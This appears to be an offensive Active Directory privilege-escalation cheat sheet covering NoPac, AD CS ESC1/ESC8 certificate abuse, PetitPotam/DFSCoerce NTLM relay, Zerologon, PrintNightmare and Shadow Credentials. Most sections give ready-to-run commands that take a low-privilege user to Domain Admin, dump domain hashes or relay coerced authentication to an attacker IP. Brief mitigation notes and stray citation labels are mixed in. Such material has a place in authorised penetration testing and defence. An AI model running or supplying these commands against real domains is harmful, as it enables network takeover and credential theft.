2) NoPac — sAMAccountName Spoofing + KDC Confusion (CVE‑2021‑42278 & CVE‑2021‑42287)

Effect: Std domain user → Domain Admin in 1–2 steps if DCs unpatched (Nov 2021).
Target indicators: Unpatched DCs; ability to modify/clear machine SPNs or create machine accounts. 
Fortinet
Qualys ThreatPROTECT

# One-liner to DA (Ridter/noPac)
python3 noPac.py corp.local/user:'Pass123!' -dc-ip 10.0.0.10 --impersonate administrator -shell  # (🔊 LOUD-Obvious)
# or dump hashes:
python3 noPac.py corp.local/user:'Pass123!' -dc-ip 10.0.0.10 --impersonate administrator -dump  # (🔊 LOUD-Obvious)


Noise: heavy LDAP/Kerberos ops → very visible. Mitigation: apply 42278/42287 patches; monitor sAMAccountName changes on computers. 
GitHub
TECHCOMMUNITY.MICROSOFT.COM

3) AD CS Misconfig (ESC1 / ESC8) + Cert Mapping (CVE‑2022‑26923)

Effect: Low‑priv user → any user/DA via certificates (misconfigs) or abusing cert mapping to elevate.
Target indicators: AD CS present; vulnerable templates (ESC1) or Web Enrollment (/certsrv) with NTLM enabled (ESC8); 26923 not fully remediated. 
GitHub
Crowe
Microsoft Support

# Enum AD CS and spot ESC paths (🕶️ Quiet)
certipy-ad find -u user@corp.local -p 'Pass123!' -dc-ip 10.0.0.10 -enabled -vulnerable -stdout

# ESC1: request client‑auth cert with arbitrary SAN=Administrator (🔊 LOUD-Overlooked)
certipy-ad req -u user@corp.local -p 'Pass123!' -ca CORP-CA -template VulnerableTemplate \
  -upn administrator@corp.local -dc-ip 10.0.0.10 -pfx admin.pfx

# ESC8: NTLM relay → AD CS web enrollment to get victim cert (🔊 LOUD-Overlooked)
python3 ntlmrelayx.py -t http://ca.corp.local/certsrv/ -adcs --template 'User' --outfile victim.pfx


Notes: MS KB5005413 has official NTLM‑relay mitigations for AD CS web enrollment; CVE‑2022‑26923 hardens cert mapping. 
Microsoft Support
+1
Hack The Box

4) Authentication Coercion → NTLM/Kerberos Relay (PetitPotam / DFSCoerce / LSA Spoofing)

Effect: Force machine/DC to authenticate to you; relay to LDAP/HTTP/SMB/AD CS for token/priv gain.
Target indicators: NTLM enabled; LDAP signing off; AD CS HTTP endpoints enabled; endpoint unpatched/hardening missing. 
CERT-EU
thehacker.recipes

# Coerce (choose one) — (🔊 LOUD-Overlooked)
python3 PetitPotam.py -d corp.local -u user -p 'Pass123!' attackerIP targetHOST
python3 dfscoerce.py  -d corp.local -u user -p 'Pass123!' attackerIP targetHOST

# Relay to AD CS (ESC8) — (🔊 LOUD-Overlooked)
python3 ntlmrelayx.py -t http://ca/certsrv/ -adcs --template 'User' --outfile victim.pfx


Related CVE: CVE‑2022‑26925 (Windows LSA Spoofing) addressed relay paths; still see misconfigs in the wild. 
Help Net Security

5) Zerologon (CVE‑2020‑1472) — still seen on forgotten DCs

Effect: Unauth network attacker → reset DC machine account → Domain Admin.
Target indicators: Legacy/test DCs not fully enforced after 2020/2021 rollout. (Use only for legacy checks.) 
Microsoft Security Response Center
CrowdStrike

# Scan/Exploit (🔊 LOUD-Obvious)
Invoke-Zerologon -FQDN dc.corp.local -Reset
impacket-secretsdump -just-dc -no-pass corp.local/dc$@dc.corp.local  # after reset

6) PrintNightmare (CVE‑2021‑34527) — when Spooler/Point&Print are misconfigured

Effect: Auth’d user → RCE as SYSTEM on vulnerable hosts / print servers.
Target indicators: Print Spooler running; Point‑and‑Print set insecurely; patch not correctly applied. 
CISA
Microsoft Security Response Center

# Typical operator flow (🔊 LOUD-Obvious): drop driver → execute payload as SYSTEM
# (Use modern PoC of choice against a lab spooler host)

7) Shadow Credentials (msDS‑KeyCredentialLink abuse) — 2021+

Effect: With GenericWrite/WriteDACL over a user/computer → add key credential → authenticate as victim (PKINIT) without changing password.
Target indicators: You control ACLs on target object; AD CS present (for PKINIT). 
Elad Shamir
ired.team

# Add & use Shadow Creds (🕶️ Quiet)
certipy-ad shadow auto -u user@corp.local -p 'Pass123!' -account targetUser -dc-ip 10.0.0.10
# Then authenticate with issued PFX to LDAP/LDAPS/PsExec/RDP as targetUser
